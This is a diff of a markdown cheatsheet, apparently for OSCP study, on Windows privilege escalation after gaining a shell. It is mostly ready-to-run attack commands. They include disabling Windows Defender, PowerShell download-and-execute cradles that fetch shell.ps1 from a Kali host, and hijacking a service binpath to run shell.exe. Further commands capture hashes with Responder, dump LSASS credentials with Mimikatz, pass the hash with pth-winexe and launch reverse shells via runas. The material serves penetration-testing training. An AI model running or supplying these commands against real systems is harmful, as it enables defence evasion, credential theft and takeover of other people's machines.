@@ -6,7 +6,7 @@ tags: [oscp, cheatsheet, windows, privilege escalation]
 
 # Windows Privilege Escalation Cheatsheet
 
-So you got a shell, what *now*?
+So you got a shell, what *now*?<br>
 This post will help you with local enumeration as well as escalate your privileges further.
 
 Usage of different enumeration scripts and tools is encouraged, my favourite is [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS). If confused which executable to use, use [this](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASany.exe)
@@ -18,85 +18,206 @@ Keep in mind:
     * service stop permission
 * Look for non-standard programs on the system
 
-*Note: This is a live document. I'll be adding more content as I learn more*
+*Note: This is a live document. I'll be adding more content as I learn*
 
 ## Binaries
 Get 64-bit netcat from [here](https://eternallybored.org/misc/netcat/)
 Get Chisel from [here](https://github.com/jpillora/chisel/releases) 
 
 ## General Information
+If nothing is specified, assume command can be run on cmd.exe or powershell.exe
+
+### Who am I?
 ``` powershell
-# If nothing is specified, assume command can be run on cmd.exe or powershell.exe
 whoami
 echo %username%
-whoami /all
+```
 
+### Do I have anything fun?
+Notice groups you are part of and privileges you have
+``` powershell
+whoami /all
+```
+
+### Where am I?
+``` powershell
 hostname
 echo %hostname%
+```
 
+### Anyone home?
+Local users
+``` powershell
 net users
-net users username
+```
+Domain users
+``` powershell
+net users /domain
+```
 
-# Note hostname, patches, architecture
+### What am I part of?
+Local groups
+``` powershell
+net groups
+```
+
+Domain groups
+``` powershell
+net groups /domain
+```
+
+### What is this place?
+```
 systeminfo
+```
 
-# Both should be the same for ease of exploitation
-# PowerShell
-# Make a 64-bit shell using nc64.exe
+### Is it fancy?
+Both should be the same for ease of exploitation, if either is 32-bit then try to gain a 64-bit shell.
+<br>
+Use PowerShell
+
+``` powershell
 [environment]::Is64BitOperatingSystem
 [environment]::Is64BitProcess
+```
 
-# Check LanguageMode (FullLanguage is nicer to have)
+### Am I tied up?
+Check LanguageMode. FullLanguage is nicer to have.<br>
+Use PowerShell
+``` powershell
 $ExecutionContext.SessionState.LanguageMode
+```
 
-# Check AppLocker policy
+### Anything reachable?
+Use PowerShell
+``` powershell
 Get-AppLockerPolicy -Effective
-# View RuleCollections in detail
 Get-AppLockerPolicy -Effective | select -ExpandedProperty RuleCollections
+```
 
-# all, addresses:port, PID
+### What does the inside look like?
+Look for interesting services
+``` powershell
 netstat -ano
 ```
-## File Transfer
-``` powershell
-# On KALI
-# use double-quotes if file path has spaces in it 
-sudo impacket-smbserver abcd /path/to/serve
 
-# mount drives
+### Leave me alone
+Do you have admin privs?<br>
+
+Disable Windows Defender real time monitoring
+``` powershell
+Set-MpPreference -DisableRealTimeMonitoring $true	
+```
+
+Disable Windows Defender scanning for all files downloaded
+``` powershell
+Set-MpPreference -DisableIOAVProtection $true	
+```
+
+## File Transfer
+
+### SMB
+
+On KALI, start smb server to serve files. Get impacket from [here](https://github.com/SecureAuthCorp/impacket/releases/)
+<br>
+> Use double-quotes if file path has spaces in it 
+
+``` bash
+sudo impacket-smbserver abcd /path/to/serve
+```
+You can download files in multiple ways.<br>
+**Mount drive**
+> CMD or PowerShell
+``` powershell
 net use abcd: \\kali_ip\myshare
 net use abcd: /d # disconnect
 net use abcd: /delete # then delete
-# PowerShell
+```
+> PowerShell
+``` powershell
 New-PSDrive -Name "abcd" -PSProvider "FileSystem" -Root "\\ip\abcd"
 Remove-PSDrive -Name abcd
-
-# OR copy directly from the share without mounting
+```
+**Copy w/o mounting**
+``` powershell
 copy //kali_ip/abcd/file_name C:\path\to\save
 copy C:\path\to\file //kali_ip/abcd
-copy "C:\Program Files\..\legit.exe" C:\Temp
-copy /Y C:\Downloads\shell.exe "C:\Program Files\...\legit.exe"
+```
 
-# Download to Windows
-# Load script in memory
+### HTTP
+
+Load script in memory
+> May help bypass trivial anti-virus solutions
+``` powershell
 powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ip/file')"
+```
+``` powershell
 powershell.exe iex (iwr http://ip/file -usebasicparsing)
+```
 
-# Save script on disk
+Save to disk
+``` powershell
 powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadFile('http://ip/file','C:\Users\Public\Downloads\file')"
+```
+``` powershell
 powershell.exe -nop -ep bypass -c "IWR -URI 'http://ip/file' -Outfile '/path/to/file'"
+```
+> CMD or PowerShell
+``` powershell
 certutil -urlcache -f http://kali_ip/file file
 ```
 ## Automated Enumeration
+### WinPEAS
+WinPEAS can be found [here](https://github.com/carlospolop/PEASS-ng/releases)
+
+For color, first apply below registry settings and then spawn a new shell
+```
+REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
+```
+
 ``` powershell
-# Run winPEAS
-# For color: 
-	# > REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
-	# > cmd.exe
 .\winpeasany.exe quiet
 ```
-## Accesschk
 
+### Exploit suggester
+This works well with older machines
+
+Windows exploit suggester can be found [here](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
+This script will be executed on Kali. First take the `systeminfo` info, paste it in a file
+
+An update may be required, it will generate the Excel file necessary
+``` powershell
+.\windows-exploit-suggester.py --update
+```
+
+Find vulns
+``` powershell
+.\windows-exploit-suggester.py -i systeminfo.txt -d 2022-xxx.xlsx
+```
+
+### PowerUp
+PowerUp can be found [here](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)<br>
+Although not entirely allowed, we can leverage its `Invoke-AllChecks` function to quickly find escalation points
+
+The script can be executed in multiple ways
+1. Save on disk, and execute
+``` powershell
+powershell -ep bypass -c "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
+```
+
+2. Execute from memory
+
+Modify the script to contain `Invoke-AllChecks` at the bottom of the script
+
+``` powershell
+powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ip/PowerUp.ps1')"
+```
+
+## Hacking the Services
+
+### Checking Access using Accesschk.exe
+
+Below should give you an idea of some of the useful flags
 ``` powershell
 # .\accesschk.exe /accepteula
 # -c : Name a windows service, or use * for all
@@ -107,61 +228,104 @@ certutil -urlcache -f http://kali_ip/file file
 # -u : Suppress errors
 # -v : Verbose
 # -w : Show objects with write access
+```
 
-# Check service permissions
-# ALWAYS RUN THE FOLLOWING TO CHECK IF YOU'VE PERMISSIONS TO START AND STOP THE SERVICE
+Checking service permissions
+> ALWAYS RUN THE FOLLOWING TO CHECK IF YOU'VE PERMISSIONS TO START AND STOP THE SERVICE
+``` powershell
 .\accesschk.exe /accepteula -ucqv <user> <svc_name>
+```
 
-# Get all writable services as per groups
+Get all writable services as per groups
+``` powershell
 .\accesschk.exe /accepteual -uwcqv Users *
 .\accesschk.exe /accepteula -uwcqv "Authenticated Users" *
+```
 
-# Is dir writable? - Unquoted service paths
+Check unquoted service paths by testing if directories are writable
+``` powershell
 .\accesschk.exe /accepteula -uwdv "C:\Program Files"
+```
 
-# User permissions on an executable
-.\accesschk.exe /accepteula -uqv "C:\Program Files\...\file.exe"
+Check user permissions on an executable
+``` powershell
+.\accesschk.exe /accepteula -uqv "C:\Program Files\abcd\file.exe"
+```
 
-# Find all weak permissions - folders
+Find all weak permissions
+<br>
+Folders
+
+``` powershell
 .\accesschk.exe /accepteula -uwdqs Users c:\
 .\accesschk.exe /accepteula -uwdqs "Authenticated Users" c:\
+```
+Files
 
-# Find all weak permissions - files
+``` powershell 
 .\accesschk.exe /accepteula -uwqs Users c:\*.*
 .\accesschk.exe /accepteula -uwqs "Authenticated Users" c:\*.*
+```
 
-# Registry ACL - Weak registry permissions
+Weak registry permissions
+``` powershell
 .\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\svc_name
-# PowerShell
-Get-Acl HKLM\System\CurrentControlSet\Services\svc_name | Format-List
+```
 
-# Get rights of any file, or folder
-# PowerShell
+### Getting ACLs
+Can we do something about it?
+
+> PowerShell
+
+Getting ACLs of services
+``` powershell
+Get-Acl HKLM\System\CurrentControlSet\Services\svc_name | Format-List
+```
+
+Get ACLs of any file or folder
+``` powershell
 (get-acl C:\path\to\file).access | ft IdentityReference,FileSystemRights,AccessControlType
 ```
-## sc.exe
+
+### Exploiting Services - sc.exe
+
+Query service configuration
+
+> Verify config after doing all the changes
+
 ``` powershell
-# Query service configuration
-# Verify after doing all the changes
 sc qc svc
+```
 
-# Current state of the service
+What is the current state of the service?
+``` powershell
 sc query svc
+```
 
-# Modify config
+Modifying config
+``` powershell
 sc config svc binpath= "\"C:\Downloads\shell.exe\""
+```
 
-# if dependencies exist
+If dependencies exist, make it auto or NULL
+
+> Check if you can restart the dependant svc 
+
+``` powershell
 sc config depend_svc start= auto
 net start depend_svc
 net start svc
+```
 
-# can instead remove dependency too
+``` powershell
 sc config svc depend= ""
+```
 
-# Start/stop the service
+Turn it off and back on again
+``` powershell
 net start/stop svc
 ```
+
 ## Registry 
 ``` powershell
 # Query configuration of registry entry of the service
@@ -178,36 +342,115 @@ net start/stop svc
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 ```
+
 ## Credentials or Hashes
+
+### Finding credentials
+Common creds location, always in plaintext
 ``` powershell
-# Common creds location, always in plaintext
 reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogin"
 reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
+```
 
-# If found, prints the location of the file
-dir /s <filename> # or extensions
+Look for interesting files that may contain creds
+``` powershell
 dir /s SAM
 dir /s SYSTEM
 dir /s Unattend.xml
-
-# Found creds?
-# On KALI
-# --system only works if admin creds are on hand
-winexe -U 'admin%pass123' [--system] //10.10.10.10 cmd.exe
-# Found hash?
-pth-winexe -U 'domain\admin%LM:NTLM' [--system] //10.10.10.10 cmd.exe
 ```
-## RunAs
-``` powershell
-# cmd
-runas /savecred /user:admin C:\abcd\reverse.exe
 
-# PowerShell Runas 1
+### Extracting credentials
+**No Admin**
+SMB can be used to extract credentials.<br>
+
+First check if target connects back<br>
+Start a listener on 445
+
+``` bash
+sudo nc -nvlp 445
+```
+Get target to connect to it 
+``` powershell
+copy \\kali_ip\test\file
+```
+If nc shows connection, it means hash can be extracted
+
+> Responder is an [OffSec authorized tool now](https://help.offensive-security.com/hc/en-us/articles/4412170923924-OSCP-Exam-FAQ)
+
+Replace interface as required
+
+``` sudo
+sudo responder -I tun0 -wrf
+```
+
+Get the target to connect to your server and it will start dropping hashes. These are now required to cracked by your fav cracker (john or hashcat) to be able to use them to pass-the-hash
+
+**With Admin**
+Mimikatz requires admin since a handle on lsass is needed to play with credentials (tokens,hashes,tickets)
+Use can either use mimikatz.exe or Invoke-Mimikatz.ps1
+
+Elevate privileges to debug
+``` powershell
+privilege::debug
+```
+
+Dump logged on user and computer credentials
+``` powershell
+sekurlsa::logonpasswords
+```
+
+Elevate privileges to SYSTEM by impersonation
+``` powershell
+token::elevate
+```
+
+Retrieves credential from LSA
+``` powershell
+lsadump::lsa /patch
+```
+
+List credentials in CredentialManager
+``` powershell
+vault::list
+```
+
+Dump credentials in CredentialManager - plaintext password
+``` powershell
+vault::cred /patch
+```
+
+### Leverage credentials
+Found plaintext password?
+On attacker machine you can attempt to login
+
+`--system` only works if admin creds are on hand
+
+``` powershell
+winexe -U 'user%pass123' [--system] //10.10.10.10 cmd.exe
+```
+
+Found hash instead of plaintext password?
+``` powershell
+pth-winexe -U 'domain\user%hash' [--system] //10.10.10.10 cmd.exe
+```
+
+## RunAs
+CMD
+``` powershell
+runas /savecred /user:admin C:\abcd\reverse.exe
+```
+
+PowerShell Runas 1
+
+``` powershell
 $password = ConvertTo-SecureString 'pass123' -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential('Administrator', $password)
 Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://kali_ip/shell.ps1')" -Credential $cred
+``` 
 
-# PowerShell Runas 2
+PowerShell Runas 2
+
+``` powershell
 $username = "domain\Administrator"
 $password = "pass123"
 $secstr = New-Object -TypeName System.Security.SecureString
@@ -217,8 +460,15 @@ Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http
 ```
 
 ## Find Files Fast
+
+CMD or PowerShell
 ``` powershell
 dir /s <filename> # or extensions
+```
+
+PowerShell
+
+``` powershell
 Get-ChildItem -Path C:\ -Include *filename_wildcard* -Recurse -ErrorAction SilentlyContinue
 ```
 
@@ -236,12 +486,4 @@ Get-ChildItem -Path C:\ -Include *filename_wildcard* -Recurse -ErrorAction Silen
 winexe -U 'administrator%pass123' --system //127.0.0.1 KALI_PORT
 smbexec.py domain/username:password@127.0.0.1 
 mysql --host=127.0.0.1 --port=KALI_PORT -u username -p
-```
-## Exploit suggester
-Windows exploit suggester can be found [here](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
-``` powershell
-# On KALI
-# Find exploits
-# .\windows-exploit-suggester.py --update
-.\windows-exploit-suggester.py -i systeminfo.txt -d 2020-xxx.xlsx
 ```
